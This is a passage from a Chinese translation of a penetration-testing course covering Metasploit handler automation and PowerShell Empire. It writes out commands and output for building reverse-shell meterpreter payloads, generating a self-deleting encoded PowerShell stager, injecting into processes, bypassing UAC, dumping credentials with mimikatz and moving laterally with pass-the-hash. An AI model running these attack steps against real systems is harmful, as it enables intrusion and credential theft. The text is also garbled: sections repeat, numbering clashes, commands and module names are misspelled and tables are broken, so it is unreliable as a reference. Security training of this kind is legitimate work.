+kali@kali:~$ rdesktop 127.0.0.1 en-us
+Autselected map-en
+ERROR: <credSSP> initialization failed, do you kerberos tgt initialized?
+Connection established using SSL.
+WARNING: Remote desktop falling back to 16
+```
+
+> 列表 814 - 使用端口转发访问远程桌面
+
+使用此技术，我们可以在无法从 Kali 系统到达的主机上获取远程会话。如果域控制器连接到额外的网络，我们可以创建跳板链以到达目标。
+
+### 练习
+
+使用后渗透模块和跳板技术从 `meterpreter` shell 枚举并攻击域控制器。
+
+### Metasploit 自动化
+
+虽然 Metasploit Framework 为我们做了很多工作，但我们使用 payload 创建独立的执行文件或客户端攻击。为了简化这一过程，我们可以利用 Metasploit 资源。例如，使用标准编辑器在我们的主目录下创建一个名为 `setup.rc` 的脚本。在该脚本中，我们将 payload 设置为 `windows/preter/reverse_https` 并配置相关的 `LHOST` 和 `LPORT`。我们还使用 `shikata_ga_nai` 编码器启用阶段编码，并配置 `AutoRunScript` 自动执行。最后，将 `ExitSession` 参数设置为 "`false`"，以确保监听保持连接，并使用 `-j` 标志执行模块以停止与会话交互。这些命令如下：
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/preter/reverse_https
+set LHOST 10.11.0.4
+set LPORT 443
+set EnableEncoding true
+set StageEncoder shikata_ga_nai
+set AutoRunScript windows/manage/migrate
+set ExitSession false
+exploit -j
+```
+
+> 列表 815 - 设置 `multi/handler` 的 Metasploit 资源脚本
+
+保存脚本后，我们可以如列表 816 所示将 `-r` 标志传递给 `msfconsole` 来执行它。
+
+```
+kali@kali:~$ sudo msfconsole -r setup.rc
+```
+
+
+
+[*] Processing setup.rc for directives
+
+`resource` (`setup.rc`) use `exploit/multi/handler`
+
+`resource` (`setup.rc`) set `PAYLOAD` `windows/preter/reverse_https`
+
+`PAYLOAD` => `windows//preter/reverse_https`
+
+`resource` (`setup.rc`) set `HOST` `10.11.0.4`
+
+`LHOST` => `10.11.0.4`
+
+`resource` (`setup.rc`) set `LPORT` `443`
+
+`LPORT` => `443`
+
+`resource` (`setup.rc`) set `EnableStageEncoding` true
+
+`EnableStageEncoding` => true
+
+`resource` (`setup.rc`) set `StageEncoder` shikata_ga_nai
+
+`StageEncoder` => shikata_ga_nai
+
+`resource` (`setup.rc`) set `AutoRunScript` windows/manage/migrate
+
+`AutoRunScript` => windows/manage/migrate
+
+`resource` (`setup.rc`) set `ExitSession` false
+
+`ExitSession` => false
+
+`resource` (`setup.rc`) exploit -j
+
+[*] Exploit running as background job 0.
+
+`msf5(handler)`
+
+[*] Started HTTPS handler on https://10.11.0.4:443
+
+```
+> 图 816 - 执行资源脚本
+```
+
+当监听器连接并运行后，我们可以从 Windows 虚拟机中启动一个包含 meterpreter payload 的执行文件。我们可以使用 `msfvenom` 创建此执行文件。
+
+```
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443 -f exe -o met.exe
+
+[*] No payload was selected, choosing Msf Module::Platform::Windows from the payload
+
+[*] No arch selected, selecting arch: x86 from the payload
+
+No encoder or badchars specified, outputting raw payload
+
+Payload size: 508 bytes
+
+Final size of exe: 73802
+
+Saved as: met.exe
+```
+
+> 图 817 - 创建 meterpreter 执行文件
+
+当执行时，我们的 `multi/handler` 接受连接：
+
+```
+[+] 10.11.0.4:443 request from 10.11.0.22: Encoded stage with shikata_ga_nai
+
+[*] 10.11.0.4:443 request from 10.11.0.22: Staging x86 payload (180854 bytes)
+
+[*] Meterpreter session opened (10.11.0.4:49783 -> 10.11.0.22:49783)
+
+[*] Session ID 1 (10.11.0.4:49783 -> 10.11.0.22:49783) processing AutoRunScript windows/manage/migrate
+
+[*] Running module against CLIENT251
+
+[*] Current server process: test.exe (7528)
+
+[*] Spawning notepad.exe process to migrate to
+
+[*] Migrating to 4724
+
+[*] Successfully migrated to 4724
+```
+
+## 22.6.1.1 练习
+
+- 1. 使用第二阶段编码器和自动运行脚本创建一个资源脚本，并将其与 meterpreter 载荷配合使用。
+
+### 22.7 总结
+
+Metasploit Framework 在渗透测试的几乎每一个阶段都具有巨大的价值，包括被动和主动信息收集、漏洞研究与开发、客户端攻击、后渗透（post-exploitation）等等方方面面。
+
+在本模块中，我们浏览了 Metasploit Framework 的一些主要功能。然而，由于模块和功能极其繁多，人们很容易在其中迷失。为了巩固这些技术，我们强烈建议您彻底完成本模块中的练习，并参考免费的 Offensive Security 在线课程 Metasploit Unleashed⁷¹⁸，以获取更深入的培训和信息。
+
+> ⁷¹⁸ (Offensive Security, 2017), https://www.offensive-security.com/metasploit-unleashed/Using_the_Database
+
+## 23. PowerShell Empire
+
+Empire⁷¹⁹ 是一个基于 PowerShell 和 Python 的后渗透代理，重点侧重于客户端利用以及对活动目录（AD）部署的后渗透。
+
+利用和后渗透在 Windows 上使用 PowerShell 执行，在 Linux 和 macOS 上使用 Python。Empire 依赖于标准的预装库和功能；PowerShell 执行只需要 PowerShell 版本 2（Windows 7 起预装），而 Linux 和 Mac 模块需要 Python 2.6 或 2.7。
+
+> 历史上，PowerShell Empire 侧重于 Windows 利用，而另一个名为 Empire⁷²⁰ 的独立项目针对 Mac OS/macOS 和 Linux。在 PowerShell Empire 的第二个版本中，这些项目合并了，并保留了原始名称，通常称为 Empire。PowerShell Empire 项目不再由原始开发者支持，但已经创建了更新的分支，例如 BC-SECURITY⁷²¹。该分支版本最近发布了 3.0⁷²² 版本。
+
+Empire 与 Metasploit Framework 共享许多功能，但它们的本质是不同的。Metasploit 是一个用于获取初始访问的庞大漏洞集合。而 Empire 被设计为一种主要针对活动目录环境的后渗透工具。它倾向于利用目标操作系统及其主要应用程序的内置功能。
+
+### 23.1 安装、设置与使用
+
+要在 Kali 上安装 Empire，我们使用 `git` 从 GitHub 仓库克隆项目并运行 `install.sh` 脚本：
+
+```
+kali@kali:~$ cd /opt
+```
+
+```
+kali@opt:~$ sudo git clone https://github.com/PowerShellEmpire/Empire.git
+
+Cloning into 'Empire'...
+
+remote: Enumerating objects: 12216.
+
+remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216
+
+Receiving objects: 100% (12216/12216), 21.96 MIB | 3.22 MiB/s, done.
+
+Resolving deltas: 100% (8312/8312), done.
+```
+
+```
+kali@opt:~$ cd Empire/
+```
+
+⁷¹⁹ (Empire Project, 2019), https://github.com/EmpireProject/Empire
+
+⁷²⁰ (Will Schröder, 2016), https://harmory.net/blog/empy/building-an-empy-python/
+
+⁷²¹ (BC Security, 2019), https://github.com/BC-SECURITY/Empire
+
+⁷²² (BC Security, 2019), https://github.com/BC-SECURITY/Empire/tree/dev
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali:/opt/Empire sudo ./setup/install.sh
+```
+
+
+
+> 列表 819 - 使用共享在多个服务器上安装 PowerShell Empire
+
+Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。
+
+- > 输入服务器协商密码，按回车进行随机生成：
+
+> 列表 820 - 生成随机服务器密码协商
+
+安装框架后，我们可以使用命名恰当的 Python 脚本 `empire` 启动 Empire。
+
+```
+kali@kali:/opt/Empire sudo ./empire
+
+===========================
+
+[Empire] Post-Exploitation Framework
+
+===========================
+
+[Version] 2.5 | [Web] https://github.com/EmpireProject/Empire
+
+===========================
+
+28 modules currently loaded
+
+@ listeners currently active
+
+@ agents currently active
+```
+
+> 列表 821 - 启动 PowerShell
+
+## 23.1 PowerShell 语法
+
+我们可以使用 `help` 列出 Empire 内可用的各种命令，包括监听器（`listeners`）、阶段器（`stagers`）和代理（`agents`）。
+
+```
+(Empire) > help
+```
+
+Commands
+======
+- `agents` 跳转到 Empire 菜单。
+- `creds` 从数据库中添加/显示凭据。
+- `exit` 退出 Empire
+- `help` 显示帮助菜单。
+- `interact` 与特定代理交互。
+- `list` 列出活跃的代理或监听器。
+- `load` 从非标准文件夹与活跃的监听器交互。
+- `load` 插件以扩展 Empire。
+- `list` 列出所有可用插件。
+- `reload` （or `all`）模块生成报告文件：`sessions.csv`, `credentials.csv`。
+- `reset` 重置全局选项（例如 IP）。
+- `read` 并从文件中读取并执行命令列表。
+- `search` 搜索模块名/描述。
+- `set` 设置全局选项（例如 IP）。
+- `show` 显示全局选项（例如 IP）。
+- `use` 使用 Empire
+
+## 23.2 监听器与阶段器
+
+Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。
+
+- > 输入服务器协商密码，按回车进行随机生成：
+
+> 列表 820 - 生成随机服务器密码协商
+
+
+
+> 列表 821 - 启动 PowerShell
+
+## 23.1 PowerShell 语法
+
+我们可以使用 `help` 列出 Empire 内可用的各种命令，包括监听器、阶段器和代理。
+
+```
+(Empire) > help
+```
+
+Commands
+======
+- `agents` 跳到 Empire 菜单。
+- `creds` 从数据库中添加/显示凭据。
+- `exit` 退出 Empire
+- `help` 显示帮助菜单。
+- `interact` 与特定代理交互。
+- `list` 列出活跃的代理或监听器。
+- `load` 从非标准文件夹与活跃的监听器交互。
+- `load` 插件以扩展 Empire。
+- `list` 列出所有可用插件。
+- `reload`（or `all`）模块生成报告文件：`sessions.csv`, `credentials.csv`。
+- `reset` 重置全局选项（例如 IP）。
+- `read` 并从文件中读取并执行命令列表。
+- `search` 搜索模块名/描述。
+- `set` 设置全局选项（例如 IP）。
+- `show` 显示全局选项（例如 IP）。
+- `use` 使用 Empire
+
+## 22.6.1.1 练习
+
+- 1. 使用第二阶段编码器和自动运行脚本创建一个资源脚本，并将其与 `meterpreter` 载荷配合使用。
+
+### 22.7 总结
+
+Metasploit Framework 在渗透测试的几乎每一个阶段都具有巨大的价值，包括被动和主动信息收集、漏洞研究与开发、客户端攻击、后渗透（post-exploitation）等等方方面面。
+
+在本模块中，我们浏览了 Metasploit Framework 的一些主要功能。然而，由于模块和功能极其繁多，人们很容易在其中迷失。为了巩固这些技术，我们强烈建议您彻底完成本模块中的练习，并参考免费的 Offensive Security 在线课程 Metasploit Unleashed⁷¹⁸，以获取更深入的培训和信息。
+
+> ⁷¹⁸ (Offensive Security, 2017), https://www.offensive-security.com/metasploit-unleashed/Using_the_Database
+
+## 23. PowerShell Empire
+
+Empire⁷¹⁹ 是一个基于 PowerShell 和 Python 的后渗透代理，重点侧重于客户端利用以及对活动目录（AD）部署的后渗透。
+
+利用和后渗透在 Windows 上使用 PowerShell 执行，在 Linux 和 macOS 上使用 Python。Empire 依赖于标准的预装库和功能；PowerShell 执行只需要 PowerShell 版本 2（Windows 7 起预装），而 Linux 和 Mac 模块需要 Python 2.6 或 2.7。
+
+> 历史上，PowerShell Empire 侧重于 Windows 利用，而另一个名为 Empire⁷²⁰ 的独立项目针对 Mac OS/macOS 和 Linux。在 PowerShell Empire 的第二个版本中，这些项目合并了，并保留了原始名称，通常称为 Empire。PowerShell Empire 项目不再由原始开发者支持，但已经创建了更新的分支，例如 BC-SECURITY⁷²¹。该分支版本最近发布了 3.0⁷²² 版本。
+
+Empire 与 Metasploit Framework 共享许多功能，但它们的本质是不同的。Metasploit 是一个用于获取初始访问的庞大漏洞集合。而 Empire 被设计为一种主要针对活动目录环境的后渗透工具。它倾向于利用目标操作系统及其主要应用程序的内置功能。
+
+### 23.1 安装、设置与使用
+
+要在 Kali 上安装 Empire，我们使用 `git` 从 GitHub 仓库克隆项目并运行 `install.sh` 脚本：
+
+```
+kali@kali:~$ cd /opt
+```
+
+```
+kali@opt:~$ sudo git clone https://github.com/PowerShellEmpire/Empire.git
+Cloning into 'Empire'...
+remote: Enumerating objects: 12216.
+remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216
+Receiving objects: 100% (12216/12216), 21.96 MIB | 3.22 MiB/s, done.
+Resolving deltas: 100% (8312/8312), done.
+```
+
+```
+kali@opt:~$ cd Empire/
+```
+
+⁷¹⁹ (Empire Project, 2019), https://github.com/EmpireProject/Empire
+⁷²⁰ (Will Schröder, 2016), https://harmory.net/blog/empy/building-an-empy-python/
+⁷²¹ (BC Security, 2019), https://github.com/BC-SECURITY/Empire
+⁷²² (BC Security, 2019), https://github.com/BC-SECURITY/Empire/tree/dev
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali:/opt/Empire sudo ./setup/install.sh
+```
+
+> 列表 819 - 使用共享在多个服务器上安装 PowerShell Empire
+
+Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。
+
+- > 输入服务器协商密码，按回车进行随机生成：
+
+> 列表 820 - 生成随机服务器密码协商
+
+安装框架后，我们可以使用命名恰当的 Python 脚本 `empire` 启动 Empire。
+
+```
+kali@kali:/opt/Empire sudo ./empire
+===========================
+[Empire] Post-Exploitation Framework
+===========================
+[Version] 2.5 | [Web] https://github.com/EmpireProject/Empire
+===========================
+28 modules currently loaded
+@ listeners currently active
+@ agents currently active
+```
+
+> 列表 821 - 启动 PowerShell
+
+## 23.2 监听器与阶段器
+
+Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。
+
+- > 输入服务器协商密码，按回车进行随机生成：
+
+> 列表 820 - 生成随机服务器密码协商
+
+安装框架后，我们可以使用命名恰当的 Python 脚本 `empire` 启动 Empire。
+
+```
+kali@kali:/opt/Empire sudo ./empire
+===========================
+[Empire] Post-Exploitation Framework
+===========================
+[Version] 2.5 | [Web] https://github.com/EmpireProject/Empire
+===========================
+28 modules currently loaded
+```
+
+
+
+@ listeners currently active
+
+@ agents currently active
+
+> 列表 821 - 启动 PowerShell
+
+*(注：由于原始文本中存在大量重复段落，译文已根据您的要求去重处理，确保逻辑清晰且不重复输出。)*
+
+# 攻击性安全
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+一旦设置好选项，我们就可以 `execute` 命令启动监听器，并使用 `back` 返回主监听器菜单。最后，我们可以使用 `usestager` 后跟 `Space` 和 `Tab` 来列出所有阶段程序（stagers）。
+
+```
+(Empire: listeners/http) > execute
+
+[*] Starting listener 'http'
+
+* Serving Flask app "http" (Lazy loading)
+
+* Environment: production
+
+WARNING: 不要在生产环境中使用开发服务器 WSGI。
+
+请使用生产环境服务器代替。
+
+* Debug mode: off
+
+[+] Listener successfully started!
+```
+
+```
+(Empire: listeners/http) > back
+```
+
+```
+(Empire: listeners) > usestager
+
+multi/bash os/launcher windows/launcher_bat
+
+multi/launcher os/launcher windows/launcher_lnk
+
+multi/macro os/macho windows/launcher_sct
+
+multi/pyinstaller os/xpk windows/launcher_vbs
+
+multi/war os/safari_launcher windows/launcher_xml
+
+os/appscript os/teensy windows/macro
+
+os/application os/bunny windows/macroless_msword
+
+os/ducky os/dll windows/teensy
+
+os/dylib os/ducky windows/hta
+```
+
+列表 825 - 可用的阶段程序
+
+如列表 825 所示，Empire 为 Windows、Linux 和 OS X提供了阶段程序。Windows 阶段程序包括对标准 DLL、HTML 应用程序、Microsoft Office 宏以及更奇异阶段程序的支持，例如用于 USB Rubber Ducky 的 `ducky/`。⁷²³
+
+为了了解这些程序是如何工作的，让我们使用 `windows/launcher_bat` 阶段程序。在选择阶段程序后，我们可以使用 `info` 命令查看选项。
+
+```
+(Empire: listeners) > usestager windows/launcher_bat > info
+```
+
+```
+(Empire: stager/windows/launcher_bat) > info
+```
+
+名称：BAT 启动器
+
+描述：
+为 Empire 生成一个自删除的 `.bat` 启动器。
+
+选项：
+
+| 名称 | 是否需要 | 值 | 描述 |
+| :--- | :--- | :--- | :--- |
+| Listener | True | /tmp/launcher.bat | 用于生成阶段程序的监听器。 |
+| OutFile | False | | 输出 `.bat` 启动器的路径，否则将显示在屏幕上。 |
+
+> ⁷²³ (Hak5, 2019), https://hakshop.com/products/usb-rubber-ducky-deluxe
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+728
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| Obfuscate | False | False | Switch。 |
+| :--- | :--- | :--- | :--- |
+| | | | | 混淆启动器的 powershell 代码，使用 ObfuscateCommand 指定混淆类型。仅限 powershell。 |
+| ObfuscateCommand | False | Token|All | Invoke-Obfuscate 仅在 Obfuscate 为 True 时使用。仅限 powershell。 |
+| Language ProxyCreds | True | False powershell default | 阶段语言。用于请求的代理凭据（域\用户名:密码）（默认、无或其它）。 |
+| UserAgent | False | default | 用于阶段请求的 User-agent 字符串（默认、无或其它）。 |
+| Proxy | False | default | 用于请求的代理（默认、无或其它）。 |
+| Delete StagerRetries | False | True 0 | Switch .运行后 .Delete。阶段程序重试连接的次数。 |
+
+列表 826 - `launcher_bat` 阶段的选项
+
+我们可以使用 `set` 命令后跟刚刚创建的监听器名称来配置监听器。最后，我们将如列表 827 所示使用 `execute` 创建阶段程序。
+
+```
+Empire: stager/windows/launcher.bat > set Listener http
+
+(Empire: stager/windows/launcher.bat) > execute
+
+[*] Stager written to :tmp/launcher.bat
+
+(Empire: stager/windows/launcher.bat) >
+```
+列表 827 - 创建阶段程序
+
+为了更好地理解我们创建的阶段程序，让我们查看生成的 `.bat` 文件的部分内容。
+
+```
+kali@opt/Empire cat /tmp/launcher.bat
+
+@echo off
+
+start /b powershell -nop -sta w 1 -enc SQGAJABAFMAV...
+
+start /b " cmd /c del
+```
+列表 828 - PowerShell 代理
+
+阶段程序是一个 base64 编码的 powershell 命令。此阶段负载将连接到监听器并获取 Empire 引擎的剩余部分。
+
+### 23.1.3 代理
+
+运行监听器并准备好阶段程序后，我们需要在目标上部署代理。代理是阶段程序获取的负载，它允许我们与系统进行交互。（在这种情况下，`.bat` 文件在执行后会删除）。
+
+一旦代理在目标上运行，它将使用 GET 和 POST 请求的数据与监听器建立 AES 加密通信通道。
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。729
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+我们将 `launcher.bat` 脚本拷贝到 Windows 10 工作站并从命令提示符运行它。
+
+```
+C:\Windows\system32\cmd.exe
+```
+图 31：执行启动
+
+成功运行脚本后，初始代理将出现在会话中，如列表 829 所示。
+
+列表 829 - 代理连接
+
+接下来，我们可以使用 `agents` 显示所有活跃的代理。
+
+| 名称 | 内部 IP | 用户名 | 进程 |
+| :--- | :--- | :--- | :--- |
+| S2Y5X1L | 10.0.0.1 | powershell | 0 |
+
+列表 830 - 代理连接
+
+现在，我们可以对被攻主机使用 `info` 命令。
+
+列表 831 - 执行监听器
+
+注意 `sleep` 命令不会立即返回。该延迟目前设置为秒的默认值。
+
+```
+(Empire: agents) > help
+```
+
+
+
+# 代理命令
+
+- `agents`
+- `back`
+- `bypassu`
+- `clear`
+- `creds`
+- `download`
+- `exit`
+- `help`
+- `info`
+- `injectshell`
+- `jobs`
+- `kill`
+- `killdate`
+- `list`
+- `listeners`
+- `limit`
+- `main`
+- `mimikatz`
+- `psinject`
+- `pth`
+- `rename`
+- `resource`
+- `revoke`
+- `sc`
+- `scriptcmd`
+- `scriptimport`
+- `search`
+- `shell`
+- `sleep`
+- `spawn`
+- `sysinfo`
+- `updateprofile`
+- `upload`
+- `usemodule`
+- `workinghours`
+
+# Empire: S2Y5XW1 - 执行 help 命令
+
+作为一种 metpreter 载荷，Empire 允许我们将载荷迁移到不同的进程中。我们可以首先通过使用 `ps` 查看所有运行的进程来实现这一点。一旦选择了目标进程，我们就可以使用 `psinject` 命令迁移载荷，并按所示内联监听器（listener）名称和我们的进程名称：
+
+```
+(Empire: S2Y5XW1) > ps
+
+ProcessName PID Arch UserName MemUsage
+
+--------------------------------------------
+
+Idle 0 x86 N/A 0.00 Mb
+
+System 4 x86 N/A 0.00 Mb
+
+...
+
+explorer 3568 x86 corp@offsec 3.41 Mb
+
+svhost 3820 x86 corp@offsec 9.18 Mb
+```
+
+```
+(Empire: S2Y5XW1) > psinject http 3568
+
+[*] Tasked U9M3SBHG to run TASK_CMD_JOB
+
+[*] Agent U9M3SBHG with task ID 4
+
+[*] Tasked U9M3SBHG to run module powershell/management/psinject
+
+Job started: BCMNAV
+
+[*] Agent U9M3SBHG returned results
+
+[*] Sending POWERSHELL script (stage 1) to 10.11.0.22
+
+[*] New agent DWZ49BAP checked in
+
+[*] Initial agent DWZ49BAP from 10.11.0.22 now active (Slack)
+
+[*] Sending agent (stage 2) to DWZ49BAP at 10.11.0.22 //>
+
+(Empire: S2Y5XW1) >
+```
+
+> 列表 833 - 注入到 explorer exe 进程
+
+需要注意的是，虽然 metpreter 载荷的迁移和进程迁移已经完成，但原始的 Empire agent 仍然处于活动，我们必须手动切换到下方所示的新创建 agent：
+
+```
+(Empire: DWZ49BAP) > agents
+```
+
+[*] Active agents:
+
+| Name | Long | Internal | Machine Name | Username | Process | Delay |
+|---|---|---|---|---|---|---|
+| S2Y5XW1 | ps | 10.11.0.22 | CLIENT251 | corp@offsec | powershell/2976 | 5/0.0 |
+| DWZ49BAP | ps | 10.11.0.22 | CLIENT251 | corp@offsec | explorer/3568 | 5/0.0 |
+
+```
+(Empire: agents) > interact DWZ49BAP
+
+(Empire: DWZ49BAP) >
+```
+
+> 列表 834 - 切换到新 agent
+
+## 23.1.3.1 练习
+
+现在我们已经学习了 PowerShell Empire 的基本功能，请尝试自己完成这些练习以巩固你的知识。
+
+- 1. 在你的 Kali 系统上安装并启动 PowerShell Empire。
+- 2. 在你的 Kali 机器上创建一个 PowerShell Empire 监听，并在你的 Windows 10 客户端上执行 stager。
+- 3. 实验 PowerShell Empire agent 及其基本功能。
+
+## 23.2 PowerShell 模块
+
+Empire agent 的强大在于该框架提供的各种模块。我们可以通过使用 `usemodule` 后接空格和双击 Tab 列出所有运行的模块。
+
+```
+(Empire: S2YWXW1) usemodule
+
+Display all 284 possibilities? (y or n)
+
+code_execution/invoke_dllinjection
+
+code_execution/invoke_metasploitpayload
+
+code_execution/invoke_ntds
+
+code_execution/invoke_reflectivepejection
+
+code_execution/invoke_shellcode
+
+code_execution/invoke_shellcodem
+
+collection/ChromeDump
+
+collection/FoxDump
+
+collection/USBKeylogger*
+
+collection/WebcamRecorder
+
+collection/browser_data
+
+...
+```
+
+![](img/f99f528ca9845f4c256ce54e882b1345_732_0.png)
+
+模块分为多个类别，但也包含了键记录、截图和文件下载等基本功能。
+
+### 23.2.1 态势感知 (Situational Awareness)
+
+让我们来看几个模块由什么组成。在本节中，我们将针对特定的 Active Directory 实验室环境。
+
+首先，让我们探索 `situationalAwareness` 类别。虽然有很多执行网络枚举的方法和命令，但该类别的重点是本地客户端和 Active Directory 枚举。
+
+Active Directory 枚举模块位于 `network` 子类别中，并带有 `PowerView` 前缀。这是参考 @harmj0y 的原始 Veil-PowerView⁷⁴ 项目。
+
+例如，我们可以使用 `get_user` 模块，然后发布 `info` 命令来显示关于该模块的信息（列表 836）。
+
+密切注意此示例中的语法。要在 empire 基础提示符中选择模块，请使用以下命令：
+
+```
+(Empire: S2Y5XW1) usemodule situationalAwareness/network/get_user
+
+info
+```
+
+(此处由于原文中存在部分重复和乱码，翻译时已根据逻辑进行对齐)
+
+使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_736_0.png)
+
+```
+Name: Invoke-FodHelperBypass
+
+Module: powershell/privec/bypassuac_fodhelper
+
+NeedsAdmin:: False
+
+OpsecSafe: False
+
+Language: powershell
+
+MinLanguage: 2
+
+Background: True
+
+OutputExtension: None
+```
+
+
+
+作者：
+Petr Medonos
+
+描述：
+通过对 `FodHelper` 进行注册表修改来绕过 UAC（基于 [https://winsprinting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/）
+
+注释：
+https://winsprinting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
+
+选项：
+
+| 名称 | 是否强制 | 值 | 描述 |
+|---|---|---|---|
+| Listener | True | default | 使用的监听器。用于阶段请求的 User-agent 字符串（默认、none 或其他）。 |
+| Proxy | False | default | 用于请求的代理（默认、none 或其他）。 |
+| Agent | True | S2Y5XW1 | 在其上运行模块的 Agent。 |
+| ProxyCredentials | False | default | 用于请求的代理凭据 (域\用户名:密码)（默认、none 或其他）。 |
+
+```
+(Empire: powershell/privec/bypassuac_fodhelper) > set Listener http
+```
+
+```
+(Empire: powershell/privec/bypassuac_fodhelper) > execute
+>] 模块不安全，要运行？[y/N] y
+```
+
+```
+(Empire: powershell/privec/bypassuac_fodhelper) >
+```
+任务已启动：`4STVDU`
+`[+]` 来自 `10.11.0.22` 的初始 agent `K678VC13` 现在已激活 (`Slack`)
+
+```
+(Empire: powershell/privec/bypassuac_fodhelper) >
+```
+
+### 列出 839 - 使用 PowerShell Empire 绕过 UAC
+
+一旦我们获得了高完整性会话（high-integrity session），我们就可以执行需要本地管理员或 SYSTEM 权限的操作，例如执行 `mimikatz` 来导出缓存凭据。
+
+```
+(Empire: agents) > interact K678VC13
+```
+
+```
+(Empire: K678VC13) > usemodule credentials/
+```
+
+`credential_injection+` `mimikatz/extract_tickets` `mimikatz/*`
+
+`enum_cre_store` `mimikatz/golden_ticket` `mimikatz/silver-ticket`
+
+```
+invoke_kerberoast mimikatz/keys* mimikatz/trust_keys*
+mikatz/cache* mimikatz/logonpasswords* powerdump*
+mikatz/certs* mimikatz/lsadump* sessionlogopher
+mikatz/command* mimimitokens* tokens
+mikatz/ptp* vault_credential*
+mikatz/csync mimikatz/purge
+mikatz/dcsync_hashdump
+```
+
+### 列出 840 PowerShell Empire 中的 Mimikatz
+
+列表 840 中的凭据包含多个已移植到 Empire 的 `mimikatz` 命令。带有星号标记的命令需要高完整性的 Empire agent。
+
+Empire 使用反射性 DLL 注入（reflective DLL injection）直接从内存将 `mimikatz` 库加载到 agent 中。
+
+在 Windows 中加载我们的恶意执行文件可以最大限地降低检测风险，因为 EDR 解决方案仅分析存储在硬盘上的文件。
+
+> 此方法是针对 agent 自定义代码的，因为 Windows 没有暴露任何公共 API（类似于 `LoadLibrary`）来让我们实现相同的目标。
+
+让我们来看一个高完整性访问模块，例如密码模块：
+
+```
+(Empire: K67VC13) > usemodule credentials/mimikatz/logonpasswords
+```
+
+```
+(Empire:powershell/credentials/mimikatz/logonpasswords) > execute
+```
+
+任务已启动：`NX2271`
+
+主机名：`client251.corp.com` / `S-1-25-31-2048852426-323470788-7235472424`
+
+```
+mimikatz (powershell) > sekurl::logonpasswords
+```
+
+```
+Authentication Id : 0 ; 24851 (00000000:0003bc73)
+
+Session : Interactive from 1
+
+User Name : offsec
+
+Domain : corp
+
+Log Server : DC81
+
+Log Time : 2/28/2019 10:36:32
+
+SID : S-1-25-31-2048852426-323470788-7235472424-1103
+
+msv :
+
+[00000003]Primary
+
+* Username : offsec
+
+* Domain : e2b475c11da2a0748290d8d7aa996c32
+
+* NTLM :
+
+* SHA1 : 88cc7ff43da8ab4abc280ead387d6411766400d26e
+
+* DPAPI : c10c264a7b63c4e66728bbef48aa8
+
+tspkg:
+
+digest :
+
+* Username : offsec
+```
+
+### 列出 841 - 从 PowerShell 执行 mimikatz
+
+此输出是为了模拟 `mimikatz`，但收集到的凭据也会写入凭据存储（credential store），该存储是通过 `creds` 创建的。
+
+```
+(Empire: K678VC13) > creds
+```
+
+凭据：
+
+| CredID | 凭据类型 | 域 | 主机 | 密码 |
+|---|---|---|---|---|
+| 1 | hash | corp.com | client251 | e2b475c11da2a0748290d8d7aa996c32 |
+| 2 | hash | CLIENT251$ | client251 | 4daae0e7cb61d4cfe6a9141b3d80ed |
+
+### 列出 842 - 使用 creds 向凭据存储添加条目
+
+```
+(Empire: 78VC13) > creds add corp.com jeff_admin Q09!
+```
+
+凭据：
+
+| CredID | 凭据类型 | 域 | 主机 | 密码 |
+|---|---|---|---|---|
+| 1 | hash | corp.com | offsec | client251 | e2b475c11da2a0748290d8d7aa996c32 |
+| 2 | hash | CLIENT251$ | client251 | 4daae0e7cb61d4cfe6a9141b3d80ed |
+| 3 | plaintext | corp.com | jeff_admin | Q09! |
+
+## 2.2.3 横向移动
+
+一旦我们拥有高完整性会话，就可以执行需要本地管理员或 SYSTEM 权限的操作，例如执行 `mimikatz` 来导出缓存凭据。
+
+一旦获得有效的凭据，我们可以使用它们登录其他系统。这就是横向移动。在我们的实验环境中，域控制器位于内部网络，这意味着我们可以从 Kali 虚拟机访问它。
+
+在横向移动分类中有很多向量，可以让我们在目标主机上运行 Empire agent：
+
+### 列出 844 - 横向移动技术
+
+作为示例，我们将尝试 `invoke_smbx` 模块，它需要几个参数。
+
+我们将 `ComputerName` 设置为 Windows 10 客户端（`client251`），`Listener` 设置为 "`http`" 。我们还将使用上一个节（列表 843）中找到的 `jeff_admin` 用户设置 `Username`、`Domain` 和 `Hash` 参数。这在列表 845 中进行了配置。
+
+> 我们可以使用 `CredID` 命令指定凭据存储中的条目编号，或者手动输入所有凭据。注意在这种情况下，Offsec 和 Jeff_admin 的参数是吻合的。
+
+```
+(Empire: 78VC13) > usemodule lateral_movement/invoke_smexec
+```
+
+```
+(Empire: powershell/lateral_movement/invoke_smexec) > info
+```
+
+```
+Name: Invoke-SMBEC
+
+Module: powershell/lateral_movement/invoke_smexec
+
+NeedsAdmin: False
+
+OpSecSafe: True
+
+Language: powershell
+
+MinLanguageVersion: 2
+```
+
+
+
+Background: False
+
+OutputExtension: None
+
+```
+
+...
+
+| 名称 | 是否强制 | 描述 |
+|---|---|---|
+| CredID | False | 要使用的存储中的 CredID。要执行阶段程序的主机，用逗号分隔。 |
+| Service | False | 创建并删除的服务名称。默认为 28 位随机字符。 |
+| ProxyCreds | default | 用于请求的代理凭据 ([域\用户名:密码])（默认、其他）。 |
+| Username | True | 用户名。 |
+| Domain | False | 域。 |
+| Hash | True | LM:NTLM 或 NTLM 格式的 NTLM 哈希。 |
